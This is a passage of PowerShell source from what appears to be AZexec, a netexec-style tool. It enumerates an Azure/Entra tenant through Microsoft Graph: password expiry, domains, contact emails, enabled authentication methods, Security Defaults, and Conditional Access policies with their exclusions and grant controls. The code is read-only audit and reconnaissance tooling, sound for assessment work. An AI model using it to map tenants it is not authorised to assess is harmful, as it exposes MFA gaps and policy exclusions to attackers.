        ConditionalAccessPolicies = @()
        AuthenticationMethods = @{}
    }
    
    try {
        # Get organization details
        $org = Get-MgOrganization -ErrorAction Stop
        
        if ($org) {
            $policyData.TenantId = $org.Id
            $policyData.TenantDisplayName = $org.DisplayName
            
            Write-ColorOutput -Message "[+] Tenant: $($org.DisplayName) ($($org.Id))`n" -Color "Green"
            
            # Display password policies
            Write-ColorOutput -Message "AZR".PadRight(12) + $org.DisplayName.PadRight(35) + "443".PadRight(7) + "[*] Password Policy Information" -Color "Cyan"
            Write-ColorOutput -Message ""
            
            # Password validity period
            if ($org.PasswordValidityPeriodInDays) {
                Write-ColorOutput -Message "    [+] Password Validity Period:     $($org.PasswordValidityPeriodInDays) days" -Color "Green"
                $policyData.PasswordPolicies.ValidityPeriodDays = $org.PasswordValidityPeriodInDays
            }
            
            # Password notification window
            if ($org.PasswordNotificationWindowInDays) {
                Write-ColorOutput -Message "    [+] Password Notification Window: $($org.PasswordNotificationWindowInDays) days" -Color "Cyan"
                $policyData.PasswordPolicies.NotificationWindowDays = $org.PasswordNotificationWindowInDays
            }
            
            # Verified domains
            if ($org.VerifiedDomains) {
                Write-ColorOutput -Message "    [+] Verified Domains:             $($org.VerifiedDomains.Count) domain(s)" -Color "Cyan"
                foreach ($domain in $org.VerifiedDomains) {
                    $isDefault = if ($domain.IsDefault) { " (Default)" } else { "" }
                    $isInitial = if ($domain.IsInitial) { " (Initial)" } else { "" }
                    Write-ColorOutput -Message "        - $($domain.Name)$isDefault$isInitial" -Color "DarkGray"
                }
            }
            
            # Technical notification emails
            if ($org.TechnicalNotificationMails) {
                Write-ColorOutput -Message "    [+] Technical Notification Emails: $($org.TechnicalNotificationMails.Count)" -Color "Cyan"
                foreach ($email in $org.TechnicalNotificationMails) {
                    Write-ColorOutput -Message "        - $email" -Color "DarkGray"
                }
            }
            
            # Security contacts
            if ($org.SecurityComplianceNotificationMails) {
                Write-ColorOutput -Message "    [+] Security Notification Emails:  $($org.SecurityComplianceNotificationMails.Count)" -Color "Cyan"
                foreach ($email in $org.SecurityComplianceNotificationMails) {
                    Write-ColorOutput -Message "        - $email" -Color "DarkGray"
                }
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read organization details" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Organization.Read.All or Directory.Read.All permissions" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to retrieve organization details" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to get domain password policies
    Write-ColorOutput -Message "`n[*] Retrieving domain password policies..." -Color "Yellow"
    
    try {
        $domains = Get-MgDomain -All -ErrorAction Stop
        
        if ($domains) {
            Write-ColorOutput -Message "[+] Found $($domains.Count) domain(s)`n" -Color "Green"
            
            foreach ($domain in $domains) {
                Write-ColorOutput -Message "    [*] Domain: $($domain.Id)" -Color "Yellow"
                
                # Password validity period for the domain
                if ($domain.PasswordValidityPeriodInDays) {
                    Write-ColorOutput -Message "        Password Expiry: $($domain.PasswordValidityPeriodInDays) days" -Color "Cyan"
                }
                
                if ($domain.PasswordNotificationWindowInDays) {
                    Write-ColorOutput -Message "        Notification Window: $($domain.PasswordNotificationWindowInDays) days" -Color "Cyan"
                }
                
                if ($domain.IsDefault) {
                    Write-ColorOutput -Message "        [+] This is the DEFAULT domain" -Color "Green"
                }
                
                if ($domain.IsInitial) {
                    Write-ColorOutput -Message "        [+] This is the INITIAL domain" -Color "Green"
                }
                
                if ($domain.IsVerified) {
                    Write-ColorOutput -Message "        [+] Domain is VERIFIED" -Color "Green"
                } else {
                    Write-ColorOutput -Message "        [!] Domain is NOT verified" -Color "Yellow"
                }
                
                if ($domain.SupportedServices) {
                    Write-ColorOutput -Message "        Supported Services: $($domain.SupportedServices -join ', ')" -Color "DarkGray"
                }
                
                Write-ColorOutput -Message ""
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read domain policies" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Directory.Read.All permissions" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to retrieve domain policies" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to get authentication methods policy
    Write-ColorOutput -Message "[*] Retrieving authentication methods policy..." -Color "Yellow"
    
    try {
        $authMethods = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/authenticationMethodsPolicy" -Method GET -ErrorAction Stop
        
        if ($authMethods) {
            Write-ColorOutput -Message "[+] Authentication methods policy retrieved`n" -Color "Green"
            
            # Registration enforcement
            if ($authMethods.registrationEnforcement) {
                $authRequired = $authMethods.registrationEnforcement.authenticationMethodsRegistrationCampaign
                if ($authRequired) {
                    Write-ColorOutput -Message "    [*] MFA Registration Campaign:" -Color "Yellow"
                    Write-ColorOutput -Message "        State: $($authRequired.state)" -Color "Cyan"
                    if ($authRequired.snoozeDurationInDays) {
                        Write-ColorOutput -Message "        Snooze Duration: $($authRequired.snoozeDurationInDays) days" -Color "Cyan"
                    }
                }
            }
            
            # Authentication method configurations
            if ($authMethods.authenticationMethodConfigurations) {
                Write-ColorOutput -Message "`n    [*] Enabled Authentication Methods:" -Color "Yellow"
                
                foreach ($method in $authMethods.authenticationMethodConfigurations) {
                    if ($method.state -eq "enabled") {
                        $methodType = switch ($method.'@odata.type') {
                            "#microsoft.graph.fido2AuthenticationMethodConfiguration" { "FIDO2 Security Key" }
                            "#microsoft.graph.microsoftAuthenticatorAuthenticationMethodConfiguration" { "Microsoft Authenticator" }
                            "#microsoft.graph.smsAuthenticationMethodConfiguration" { "SMS" }
                            "#microsoft.graph.voiceAuthenticationMethodConfiguration" { "Voice Call" }
                            "#microsoft.graph.emailAuthenticationMethodConfiguration" { "Email OTP" }
                            "#microsoft.graph.temporaryAccessPassAuthenticationMethodConfiguration" { "Temporary Access Pass" }
                            "#microsoft.graph.softwareOathAuthenticationMethodConfiguration" { "Software OATH Token" }
                            default { $method.'@odata.type' -replace '#microsoft\.graph\.', '' -replace 'AuthenticationMethodConfiguration', '' }
                        }
                        Write-ColorOutput -Message "        [+] $methodType (Enabled)" -Color "Green"
                        
                        $policyData.AuthenticationMethods[$methodType] = "Enabled"
                    }
                }
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read authentication methods policy" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Policy.Read.All permissions" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Guest users typically cannot access this information" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to retrieve authentication methods policy" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to check if Security Defaults are enabled
    Write-ColorOutput -Message "`n[*] Checking Security Defaults status..." -Color "Yellow"
    
    try {
        $identitySecurityDefaults = Invoke-MgGraphRequest -Uri "https://graph.microsoft.com/v1.0/policies/identitySecurityDefaultsEnforcementPolicy" -Method GET -ErrorAction Stop
        
        if ($identitySecurityDefaults) {
            $isEnabled = $identitySecurityDefaults.isEnabled
            $policyData.SecurityDefaults = $isEnabled
            
            if ($isEnabled) {
                Write-ColorOutput -Message "[+] Security Defaults: ENABLED" -Color "Green"
                Write-ColorOutput -Message "    [*] This enforces MFA for administrators and users when needed" -Color "Cyan"
            } else {
                Write-ColorOutput -Message "[!] Security Defaults: DISABLED" -Color "Yellow"
                Write-ColorOutput -Message "    [!] Consider using Conditional Access Policies or enable Security Defaults" -Color "Yellow"
            }
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read Security Defaults status" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Policy.Read.All permissions" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Guest users typically cannot access this information" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to check Security Defaults" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Try to enumerate Conditional Access Policies
    Write-ColorOutput -Message "`n[*] Enumerating Conditional Access Policies..." -Color "Yellow"
    
    try {
        $caPolicies = Get-MgIdentityConditionalAccessPolicy -All -ErrorAction Stop
        
        if ($caPolicies) {
            Write-ColorOutput -Message "[+] Found $($caPolicies.Count) Conditional Access Policies`n" -Color "Green"
            
            $enabledCount = 0
            $reportOnlyCount = 0
            $disabledCount = 0
            
            foreach ($policy in $caPolicies) {
                $stateColor = switch ($policy.State) {
                    "enabled" { 
                        $enabledCount++
                        "Green" 
                    }
                    "enabledForReportingButNotEnforced" { 
                        $reportOnlyCount++
                        "Yellow" 
                    }
                    "disabled" { 
                        $disabledCount++
                        "DarkGray" 
                    }
                    default { "Cyan" }
                }
                
                Write-ColorOutput -Message "    [$($policy.State.ToUpper())] $($policy.DisplayName)" -Color $stateColor
                
                if ($policy.Conditions) {
                    # Show if it requires MFA
                    if ($policy.GrantControls -and $policy.GrantControls.BuiltInControls -contains "mfa") {
                        Write-ColorOutput -Message "        [+] Requires MFA" -Color "Green"
                    }
                    
                    # Show application/user scope
                    if ($policy.Conditions.Applications) {
                        $appScope = if ($policy.Conditions.Applications.IncludeApplications -contains "All") {
                            "All Applications"
                        } else {
                            "$($policy.Conditions.Applications.IncludeApplications.Count) Applications"
                        }
                        Write-ColorOutput -Message "        Scope: $appScope" -Color "DarkGray"
                    }
                }
                
                $policyData.ConditionalAccessPolicies += [PSCustomObject]@{
                    DisplayName = $policy.DisplayName
                    State = $policy.State
                    CreatedDateTime = $policy.CreatedDateTime
                    ModifiedDateTime = $policy.ModifiedDateTime
                }
            }
            
            Write-ColorOutput -Message "`n    [*] CA Policy Summary:" -Color "Yellow"
            Write-ColorOutput -Message "        Enabled: $enabledCount" -Color "Green"
            Write-ColorOutput -Message "        Report-Only: $reportOnlyCount" -Color "Yellow"
            Write-ColorOutput -Message "        Disabled: $disabledCount" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] No Conditional Access Policies found" -Color "Yellow"
            Write-ColorOutput -Message "    [!] Consider implementing Conditional Access for enhanced security" -Color "Yellow"
        }
    } catch {
        # Check if it's a permission error (403)
        if ($_.Exception.Response.StatusCode -eq 403 -or $_.Exception.Message -like "*403*" -or $_.Exception.Message -like "*Forbidden*" -or $_.Exception.Message -like "*AccessDenied*" -or $_.Exception.Message -like "*Unauthorized*") {
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read Conditional Access Policies" -Color "Yellow"
            Write-ColorOutput -Message "[*] This requires Policy.Read.All permissions" -Color "DarkGray"
            Write-ColorOutput -Message "[*] Guest users typically cannot access this information (expected behavior)" -Color "DarkGray"
        } else {
            Write-ColorOutput -Message "[!] Failed to enumerate Conditional Access Policies" -Color "Red"
            Write-ColorOutput -Message "[!] Error: $($_.Exception.Message)" -Color "Red"
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                # For CSV, flatten the data
                $exportData = [PSCustomObject]@{
                    TenantId = $policyData.TenantId
                    TenantDisplayName = $policyData.TenantDisplayName
                    PasswordValidityDays = $policyData.PasswordPolicies.ValidityPeriodDays
                    PasswordNotificationDays = $policyData.PasswordPolicies.NotificationWindowDays
                    SecurityDefaultsEnabled = $policyData.SecurityDefaults
                    ConditionalAccessPolicyCount = $policyData.ConditionalAccessPolicies.Count
                }
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Policy information exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $policyData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Policy information exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Tenant Display Name" = $policyData.TenantDisplayName
                    "Tenant ID" = $policyData.TenantId
                    "Password Validity Period (Days)" = $policyData.PasswordPolicies.ValidityPeriodDays
                    "Password Notification Window (Days)" = $policyData.PasswordPolicies.NotificationWindowDays
                    "Security Defaults Enabled" = $policyData.SecurityDefaults
                    "Conditional Access Policies" = $policyData.ConditionalAccessPolicies.Count
                    "Authentication Methods Configured" = $policyData.AuthenticationMethods.Count
                }
                
                # Create table data for CA policies if available
                $tableData = @()
                if ($policyData.ConditionalAccessPolicies.Count -gt 0) {
                    foreach ($cap in $policyData.ConditionalAccessPolicies) {
                        $tableData += [PSCustomObject]@{
                            PolicyName = $cap.DisplayName
                            State = $cap.State
                            CreatedDateTime = $cap.CreatedDateTime
                            ModifiedDateTime = $cap.ModifiedDateTime
                        }
                    }
                } else {
                    # If no CA policies, export the simple policy data
                    $tableData = @([PSCustomObject]@{
                        TenantId = $policyData.TenantId
                        TenantDisplayName = $policyData.TenantDisplayName
                        PasswordValidityDays = $policyData.PasswordPolicies.ValidityPeriodDays
                        PasswordNotificationDays = $policyData.PasswordPolicies.NotificationWindowDays
                        SecurityDefaultsEnabled = $policyData.SecurityDefaults
                    })
                }
                
                $description = "Password policy and security configuration enumeration including password expiration policies, security defaults, and conditional access policies."
                
                $success = Export-HtmlReport -Data $tableData -OutputPath $ExportPath -Title "Password Policy Enumeration Report" -Statistics $stats -CommandName "pass-pol" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to JSON for complex data
                $policyData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Policy information exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Password policy enumeration complete!" -Color "Green"
    
    # Display access summary
    Write-ColorOutput -Message "`n[*] Access Summary:" -Color "Yellow"
    
    $hasOrgDetails = $policyData.TenantId -ne $null
    $hasAuthMethods = $policyData.AuthenticationMethods.Count -gt 0
    $hasSecurityDefaults = $policyData.SecurityDefaults -ne $null
    $hasCAPolicies = $policyData.ConditionalAccessPolicies.Count -gt 0
    
    if ($hasOrgDetails) {
        Write-ColorOutput -Message "    [+] Organization details: Retrieved" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Organization details: Not accessible" -Color "DarkGray"
    }
    
    if ($hasAuthMethods) {
        Write-ColorOutput -Message "    [+] Authentication methods: Retrieved" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Authentication methods: Not accessible (requires Policy.Read.All)" -Color "DarkGray"
    }
    
    if ($hasSecurityDefaults) {
        Write-ColorOutput -Message "    [+] Security Defaults: Retrieved" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Security Defaults: Not accessible (requires Policy.Read.All)" -Color "DarkGray"
    }
    
    if ($hasCAPolicies) {
        Write-ColorOutput -Message "    [+] Conditional Access Policies: Retrieved ($($policyData.ConditionalAccessPolicies.Count) policies)" -Color "Green"
    } else {
        Write-ColorOutput -Message "    [-] Conditional Access Policies: Not accessible (requires Policy.Read.All)" -Color "DarkGray"
    }
    
    # Provide guidance based on what was accessible
    if (-not $hasAuthMethods -and -not $hasSecurityDefaults -and -not $hasCAPolicies) {
        Write-ColorOutput -Message "`n[*] Limited information retrieved - this is expected for:" -Color "Yellow"
        Write-ColorOutput -Message "    - Guest users (restricted by design)" -Color "Cyan"
        Write-ColorOutput -Message "    - Users without Policy.Read.All permissions" -Color "Cyan"
        Write-ColorOutput -Message "`n[*] To get full policy information:" -Color "Yellow"
        Write-ColorOutput -Message "    1. Request Policy.Read.All permissions from your admin" -Color "Cyan"
        Write-ColorOutput -Message "    2. Or use a member account with appropriate permissions" -Color "Cyan"
    }
}

# Format Conditional Access Policy output like netexec
function Format-ConditionalAccessPolicyOutput {
    param(
        [PSCustomObject]$Policy,
        [int]$Index,
        [int]$Total
    )
    
    # Policy display name and ID
    $policyName = if ($Policy.DisplayName) { $Policy.DisplayName } elseif ($Policy.displayName) { $Policy.displayName } else { "UNKNOWN" }
    $policyId = if ($Policy.Id) { $Policy.Id } elseif ($Policy.id) { $Policy.id } else { "N/A" }
    
    # Truncate policy name if too long
    $maxNameLength = 40
    $policyNameShort = if ($policyName.Length -gt $maxNameLength) {
        $policyName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $policyName
    }
    
    # Policy state
    $state = if ($Policy.State) { $Policy.State } elseif ($Policy.state) { $Policy.state } else { "unknown" }
    
    # Determine color based on state and controls
    $stateColor = switch ($state) {
        "enabled" { "Green" }
        "enabledForReportingButNotEnforced" { "Yellow" }
        "disabled" { "DarkGray" }
        default { "Cyan" }
    }
    
    # Check for high-risk conditions
    $isHighRisk = $false
    $riskIndicators = @()
    
    # Check for block access
    if ($Policy.GrantControls -and $Policy.GrantControls.BuiltInControls -contains "block") {
        $isHighRisk = $true
        $riskIndicators += "BLOCK_ACCESS"
    }
    
    # Check for risky sign-in conditions
    if ($Policy.Conditions -and $Policy.Conditions.SignInRiskLevels) {
        if ($Policy.Conditions.SignInRiskLevels -contains "high") {
            $riskIndicators += "HIGH_RISK"
        }
    }
    
    # Check for user risk conditions
    if ($Policy.Conditions -and $Policy.Conditions.UserRiskLevels) {
        if ($Policy.Conditions.UserRiskLevels -contains "high") {
            $riskIndicators += "USER_RISK"
        }
    }
    
    # Get grant controls summary
    $grantControls = @()
    if ($Policy.GrantControls -and $Policy.GrantControls.BuiltInControls) {
        foreach ($control in $Policy.GrantControls.BuiltInControls) {
            switch ($control) {
                "mfa" { $grantControls += "MFA" }
                "compliantDevice" { $grantControls += "Compliant Device" }
                "domainJoinedDevice" { $grantControls += "Domain Joined" }
                "approvedApplication" { $grantControls += "Approved App" }
                "compliantApplication" { $grantControls += "Compliant App" }
                "passwordChange" { $grantControls += "Password Change" }
                "block" { $grantControls += "BLOCK"; $isHighRisk = $true }
                default { $grantControls += $control }
            }
        }
    }
    
    # Build main output line in netexec style
    $indexStr = "[$Index/$Total]"
    $output = "AZR".PadRight(12) + 
              $policyId.Substring(0, [Math]::Min(15, $policyId.Length)).PadRight(18) + 
              "443".PadRight(7) + 
              $policyNameShort.PadRight(43) + 
              "$indexStr [*] (state:$state)"
    
    # Override color for high-risk policies
    if ($isHighRisk -and $state -eq "enabled") {
        $stateColor = "Red"
    }
    
    Write-ColorOutput -Message $output -Color $stateColor
    
    # Display grant controls if any
    if ($grantControls.Count -gt 0) {
        $controlsStr = $grantControls -join ", "
        Write-ColorOutput -Message "    [+] Grant Controls: $controlsStr" -Color $(if ($isHighRisk) { "Red" } else { "Cyan" })
    }
    
    # Display risk indicators if any
    if ($riskIndicators.Count -gt 0) {
        $riskStr = $riskIndicators -join ", "
        Write-ColorOutput -Message "    [!] Risk Indicators: $riskStr" -Color "Yellow"
    }
    
    # Display conditions summary
    if ($Policy.Conditions) {
        # Users/Groups
        if ($Policy.Conditions.Users) {
            if ($Policy.Conditions.Users.IncludeUsers -contains "All") {
                Write-ColorOutput -Message "    [*] Target: All Users" -Color "DarkGray"
            } elseif ($Policy.Conditions.Users.IncludeUsers -or $Policy.Conditions.Users.IncludeGroups) {
                $userCount = if ($Policy.Conditions.Users.IncludeUsers) { $Policy.Conditions.Users.IncludeUsers.Count } else { 0 }
                $groupCount = if ($Policy.Conditions.Users.IncludeGroups) { $Policy.Conditions.Users.IncludeGroups.Count } else { 0 }
                Write-ColorOutput -Message "    [*] Target: $userCount Users, $groupCount Groups" -Color "DarkGray"
            }
            
            # Exclusions
            if ($Policy.Conditions.Users.ExcludeUsers -or $Policy.Conditions.Users.ExcludeGroups) {
                $excludeUserCount = if ($Policy.Conditions.Users.ExcludeUsers) { $Policy.Conditions.Users.ExcludeUsers.Count } else { 0 }
                $excludeGroupCount = if ($Policy.Conditions.Users.ExcludeGroups) { $Policy.Conditions.Users.ExcludeGroups.Count } else { 0 }
                Write-ColorOutput -Message "    [*] Exclusions: $excludeUserCount Users, $excludeGroupCount Groups" -Color "DarkGray"
            }
        }
        
        # Applications
        if ($Policy.Conditions.Applications) {
            if ($Policy.Conditions.Applications.IncludeApplications -contains "All") {
                Write-ColorOutput -Message "    [*] Apps: All Applications" -Color "DarkGray"
            } elseif ($Policy.Conditions.Applications.IncludeApplications) {
                Write-ColorOutput -Message "    [*] Apps: $($Policy.Conditions.Applications.IncludeApplications.Count) Applications" -Color "DarkGray"
            }
        }
        
        # Platforms
        if ($Policy.Conditions.Platforms -and $Policy.Conditions.Platforms.IncludePlatforms) {
            $platforms = $Policy.Conditions.Platforms.IncludePlatforms -join ", "
            Write-ColorOutput -Message "    [*] Platforms: $platforms" -Color "DarkGray"
        }
        
        # Locations
        if ($Policy.Conditions.Locations) {
            if ($Policy.Conditions.Locations.IncludeLocations -contains "All") {
                Write-ColorOutput -Message "    [*] Locations: All" -Color "DarkGray"
            } elseif ($Policy.Conditions.Locations.IncludeLocations) {
                Write-ColorOutput -Message "    [*] Locations: $($Policy.Conditions.Locations.IncludeLocations.Count) Named Locations" -Color "DarkGray"
            }
        }
        
        # Client app types
        if ($Policy.Conditions.ClientAppTypes) {
            $clientApps = $Policy.Conditions.ClientAppTypes -join ", "
            Write-ColorOutput -Message "    [*] Client Apps: $clientApps" -Color "DarkGray"
        }
    }
    
    # Display session controls if any
    if ($Policy.SessionControls) {
        $sessionControls = @()
        
        if ($Policy.SessionControls.SignInFrequency) {
            $frequency = $Policy.SessionControls.SignInFrequency
            $sessionControls += "Sign-in Frequency: $($frequency.Value) $($frequency.Type)"
        }
        
        if ($Policy.SessionControls.PersistentBrowser) {
            $sessionControls += "Persistent Browser: $($Policy.SessionControls.PersistentBrowser.Mode)"
        }
        
        if ($Policy.SessionControls.ApplicationEnforcedRestrictions) {
            $sessionControls += "App Enforced Restrictions"
        }
        
        if ($Policy.SessionControls.CloudAppSecurity) {
            $sessionControls += "Cloud App Security: $($Policy.SessionControls.CloudAppSecurity.CloudAppSecurityType)"
        }
        
        if ($sessionControls.Count -gt 0) {
            $sessionStr = $sessionControls -join ", "
            Write-ColorOutput -Message "    [*] Session Controls: $sessionStr" -Color "Cyan"
        }
    }
    
    # Display creation and modification dates
    if ($Policy.CreatedDateTime) {
        Write-ColorOutput -Message "    [*] Created: $($Policy.CreatedDateTime)" -Color "DarkGray"
    }
    if ($Policy.ModifiedDateTime) {
        Write-ColorOutput -Message "    [*] Modified: $($Policy.ModifiedDateTime)" -Color "DarkGray"
    }
}

# Invoke Conditional Access Policy Review enumeration
function Invoke-ConditionalAccessPolicyReview {
    param(
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "[*] AZexec - Conditional Access Policy Review" -Color "Yellow"
    Write-ColorOutput -Message "[*] Enumerating Conditional Access Policies...`n" -Color "Cyan"
    
    # Check if user is a guest
    $isGuest = Test-IsGuestUser
    
    if ($isGuest) {
        Write-ColorOutput -Message "[!] WARNING: You are authenticated as a guest user" -Color "Red"
        Write-ColorOutput -Message "[!] Guest users typically cannot access Conditional Access Policies" -Color "Red"
        Write-ColorOutput -Message "[!] This command requires a member account with Policy.Read.All permissions`n" -Color "Red"
    }
    
    # Get tenant info
    $tenantInfo = $null
    try {
        $tenantInfo = Get-MgOrganization -ErrorAction Stop | Select-Object -First 1
        $tenantName = if ($tenantInfo.DisplayName) { $tenantInfo.DisplayName } else { "Unknown" }
        $tenantId = if ($tenantInfo.Id) { $tenantInfo.Id } else { "Unknown" }
        Write-ColorOutput -Message "[+] Tenant: $tenantName (ID: $tenantId)" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Could not retrieve tenant information" -Color "Yellow"
    }
    
    # Get current user context
    try {
        $context = Get-MgContext
        if ($context) {
            Write-ColorOutput -Message "[+] Authenticated as: $($context.Account)" -Color "Green"
            Write-ColorOutput -Message "[+] Required permissions: Policy.Read.All`n" -Color "Cyan"
        }
    } catch {
        Write-ColorOutput -Message "[!] Could not retrieve authentication context`n" -Color "Yellow"
    }
    
    # Initialize data collection
    $policyData = @{
        TenantId = $tenantId
        TenantDisplayName = $tenantName
        Policies = @()
        Summary = @{
            Total = 0
            Enabled = 0
            ReportOnly = 0
            Disabled = 0
            BlockPolicies = 0
            MFAPolicies = 0
        }
    }
    
    # Enumerate Conditional Access Policies
    try {
        $policies = Get-MgIdentityConditionalAccessPolicy -All -ErrorAction Stop
        
        if ($policies) {
            $policyCount = ($policies | Measure-Object).Count
            $policyData.Summary.Total = $policyCount
            
            Write-ColorOutput -Message "[+] Found $policyCount Conditional Access Policies`n" -Color "Green"
            
            $index = 1
            foreach ($policy in $policies) {
                # Update summary counts
                switch ($policy.State) {
                    "enabled" { $policyData.Summary.Enabled++ }
                    "enabledForReportingButNotEnforced" { $policyData.Summary.ReportOnly++ }
                    "disabled" { $policyData.Summary.Disabled++ }
                }
                
                # Check for block policies
                if ($policy.GrantControls -and $policy.GrantControls.BuiltInControls -contains "block") {
                    $policyData.Summary.BlockPolicies++
                }
                
                # Check for MFA policies
                if ($policy.GrantControls -and $policy.GrantControls.BuiltInControls -contains "mfa") {
                    $policyData.Summary.MFAPolicies++
                }
                
                # Format and display policy
                Format-ConditionalAccessPolicyOutput -Policy $policy -Index $index -Total $policyCount
                
                # Store policy data for export
                $policyData.Policies += [PSCustomObject]@{
                    DisplayName = $policy.DisplayName
                    Id = $policy.Id
                    State = $policy.State
                    CreatedDateTime = $policy.CreatedDateTime
                    ModifiedDateTime = $policy.ModifiedDateTime
                    GrantControls = ($policy.GrantControls.BuiltInControls -join ", ")
                    TargetUsers = if ($policy.Conditions.Users.IncludeUsers -contains "All") { "All" } else { "$($policy.Conditions.Users.IncludeUsers.Count) users" }
                    TargetApps = if ($policy.Conditions.Applications.IncludeApplications -contains "All") { "All" } else { "$($policy.Conditions.Applications.IncludeApplications.Count) apps" }
                    Platforms = ($policy.Conditions.Platforms.IncludePlatforms -join ", ")
                    ClientAppTypes = ($policy.Conditions.ClientAppTypes -join ", ")
                }
                
                $index++
                Write-Host ""
            }
            
            # Display summary
            Write-ColorOutput -Message "[*] ========================================" -Color "Yellow"
            Write-ColorOutput -Message "[*] Conditional Access Policy Summary" -Color "Yellow"
            Write-ColorOutput -Message "[*] ========================================" -Color "Yellow"
            Write-ColorOutput -Message "[+] Total Policies: $($policyData.Summary.Total)" -Color "Green"
            Write-ColorOutput -Message "    [*] Enabled: $($policyData.Summary.Enabled)" -Color "Green"
            Write-ColorOutput -Message "    [*] Report-Only: $($policyData.Summary.ReportOnly)" -Color "Yellow"
            Write-ColorOutput -Message "    [*] Disabled: $($policyData.Summary.Disabled)" -Color "DarkGray"
            Write-ColorOutput -Message "    [*] Block Policies: $($policyData.Summary.BlockPolicies)" -Color $(if ($policyData.Summary.BlockPolicies -gt 0) { "Red" } else { "DarkGray" })
            Write-ColorOutput -Message "    [*] MFA Policies: $($policyData.Summary.MFAPolicies)" -Color $(if ($policyData.Summary.MFAPolicies -gt 0) { "Green" } else { "Yellow" })
            
            # Security recommendations
            Write-ColorOutput -Message "`n[*] Security Recommendations:" -Color "Yellow"
            
            if ($policyData.Summary.Enabled -eq 0) {
                Write-ColorOutput -Message "    [!] No enabled Conditional Access Policies found - consider enabling policies" -Color "Red"
            }
            
            if ($policyData.Summary.MFAPolicies -eq 0) {
                Write-ColorOutput -Message "    [!] No MFA enforcement policies found - consider requiring MFA" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "    [+] MFA policies are configured" -Color "Green"
            }
            
            if ($policyData.Summary.ReportOnly -gt 0) {
                Write-ColorOutput -Message "    [*] $($policyData.Summary.ReportOnly) policies in report-only mode - review and enable if appropriate" -Color "Cyan"
            }
            
            if ($policyData.Summary.Disabled -gt 0) {
                Write-ColorOutput -Message "    [*] $($policyData.Summary.Disabled) policies disabled - review if still needed" -Color "DarkGray"
            }
            
        } else {
            Write-ColorOutput -Message "[!] No Conditional Access Policies found in this tenant" -Color "Yellow"
            Write-ColorOutput -Message "[*] Consider implementing Conditional Access for enhanced security" -Color "Cyan"
        }
        
    } catch {
        # Check for permission errors
        if ($_.Exception.Response.StatusCode -eq 403 -or 
            $_.Exception.Message -like "*403*" -or 
            $_.Exception.Message -like "*Forbidden*" -or 
            $_.Exception.Message -like "*AccessDenied*" -or 
            $_.Exception.Message -like "*Unauthorized*") {
            
            Write-ColorOutput -Message "[!] Access Denied: Insufficient permissions to read Conditional Access Policies" -Color "Red"
            Write-ColorOutput -Message "[*] Required permission: Policy.Read.All" -Color "Yellow"
            Write-ColorOutput -Message "[*] Guest users typically cannot access Conditional Access Policies (expected behavior)" -Color "Cyan"
            Write-ColorOutput -Message "`n[*] To access this information:" -Color "Yellow"
            Write-ColorOutput -Message "    1. Use a member account (not a guest user)" -Color "Cyan"
